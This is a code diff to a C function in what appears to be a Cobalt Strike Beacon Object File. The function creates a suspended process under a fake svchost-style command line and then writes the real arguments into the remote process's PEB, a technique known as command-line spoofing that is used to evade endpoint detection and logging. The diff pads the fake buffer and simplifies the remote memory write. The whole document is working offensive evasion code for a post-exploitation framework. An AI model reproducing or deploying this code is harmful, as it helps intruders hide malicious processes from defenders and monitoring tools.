@@ -158,16 +158,23 @@ BOOL SpawnSuspendedProcess(IN LPCSTR szProcessPath, IN OPTIONAL LPCSTR szArgumen
     // Build fake command line (benign looking)
     char szFakeArgs[] = " -k LocalServiceNetworkRestricted";
 
+    // Build real command line first so we know its length
+    size_t realBufferSize = MSVCRT$strlen(szProcessPath) + (szArguments ? MSVCRT$strlen(szArguments) + 1 : 0) + 1;
+
     size_t fakeBufferSize = MSVCRT$strlen(szProcessPath) + MSVCRT$strlen(szFakeArgs) + 1;
+    if (fakeBufferSize < realBufferSize) fakeBufferSize = realBufferSize;
     szFakeCommandLine = (LPSTR)KERNEL32$LocalAlloc(LPTR, fakeBufferSize);
     if (!szFakeCommandLine) {
         BeaconPrintf(CALLBACK_ERROR, "LocalAlloc failed for fake command line: %lu", KERNEL32$GetLastError());
         goto CLEANUP;
     }
     MSVCRT$_snprintf(szFakeCommandLine, fakeBufferSize, "%s%s", szProcessPath, szFakeArgs);
-
-    // Build real command line
-    size_t realBufferSize = MSVCRT$strlen(szProcessPath) + (szArguments ? MSVCRT$strlen(szArguments) + 1 : 0) + 1;
+    {
+        size_t len = MSVCRT$strlen(szFakeCommandLine);
+        size_t i;
+        for (i = len; i < fakeBufferSize - 1; i++) szFakeCommandLine[i] = ' ';
+        szFakeCommandLine[fakeBufferSize - 1] = '\0';
+    }
     szRealCommandLine = (LPSTR)KERNEL32$LocalAlloc(LPTR, realBufferSize);
     if (!szRealCommandLine) {
         BeaconPrintf(CALLBACK_ERROR, "Locaed: %lu", KERNEL32$GetLastError());
@@ -242,32 +249,9 @@ BOOL SpawnSuspendedProcess(IN LPCSTR szProcessPath, IN OPTIONAL LPCSTR szArgumen
         goto CLEANUP;
     }
 
-    USHORT realSizeBytes = (USHORT)(wideRealCmdLineLen * sizeof(WCHAR));
-    PVOID pTargetBuf = parameters.CommandLine.Buffer;
-
-    if (realSizeBytes > parameters.CommandLine.MaximumLength) {
-        pTargetBuf = KERNEL32$VirtualAllocEx(pProcInfo->hProcess, NULL, realSizeBytes,
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!pTargetBuf) {
-            BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx for cmdline: %lu", KERNEL32$GetLastError());
-            KERNEL32$LocalFree(wideRealCommandLine);
-            goto CLEANUP;
-        }
-
-        SIZE_T bw = 0;
-        KERNEL32$WriteProcessMemory(pProcInfo->hProcess,
-            (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Buffer),
-            &pTargetBuf, sizeof(PVOID), &bw);
-
-        USHORT newMax = realSizeBytes;
-        KERNEL32$WriteProcessMemory(pProcInfo->hProcess,
-            (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.MaximumLength),
-            &newMax, sizeof(USHORT), &bw);
-    }
-
     SIZE_T bytesWritten = 0;
-    if (!KERNEL32$WriteProcessMemory(pProcInfo->hProcess, pTargetBuf, wideRealCommandLine,
-        realSizeBytes, &bytesWritten)) {
+    if (!KERNEL32$WriteProcessMemory(pProcInfo->hProcess, parameters.CommandLine.Buffer, wideRealCommandLine,
+        wideRealCmdLineLen * sizeof(WCHAR), &bytesWritten)) {
         BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory (CommandLine) failed: %lu", KERNEL32$GetLastError());
         KERNEL32$LocalFree(wideRealCommandLine);
         goto CLEANUP;
